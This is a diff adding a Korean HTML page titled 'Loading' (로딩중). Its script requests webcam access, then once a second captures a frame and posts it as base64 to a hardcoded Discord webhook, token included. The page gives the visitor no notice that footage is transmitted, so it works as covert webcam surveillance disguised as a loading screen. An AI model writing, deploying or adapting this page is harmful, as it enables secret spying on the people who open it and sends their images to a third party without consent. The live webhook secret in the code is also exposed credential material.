@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>로딩중</title>
+</head>
+<body>
+<h3></h3>
+<video id="video" autoplay playsinline width="320" height="240" style="border:1px solid #ccc;"></video>
+<script>
+const video = document.getElementById('video');
+const canvas = document.createElement('canvas');
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1394011244968546487/5MRapXGYN7O6-TAJs333WL-UvkW4rvrvc_cN_yUeLvN1NceI7EJd1hVXBlok415JF2rX'; // 여기에 웹훅 URL 입력
+
+// 카메라 켜기
+async function startCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+  } catch (err) {
+    alert('카메라 권한이 필요합니다.');
+    console.error(err);
+  }
+}
+
+// 1초마다 캡처 후 웹훅으로 전송
+async function sendFrame() {
+  canvas.width = video.videoWidth || 320;
+  canvas.height = video.videoHeight || 240;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  const dataUrl = canvas.toDataURL('image/png');
+
+  // dataUrl에서 base64 부분만 추출
+  const base64Data = dataUrl.split(',')[1];
+
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        content: '1초마다 캡처한 이미지입니다.',
+        image: base64Data
+      }),
+    });
+    console.log('전송 완료');
+  } catch (err) {
+    console.error('전송 실패:', err);
+  }
+}
+
+// Discord 웹훅 등 일반적인 웹훅은 이미지 base64를 직접 못 받는 경우가 많아 별도 서버 필요할 수 있음.
+// 여기서는 그냥 예제로 보시면 됩니다.
+
+startCamera();
+
+// 1초마다 실행
+setInterval(() => {
+  if (video.readyState === video.HAVE_ENOUGH_DATA) {
+    sendFrame();
+  }
+}, 1000);
+</script>
+</body>
+</html>
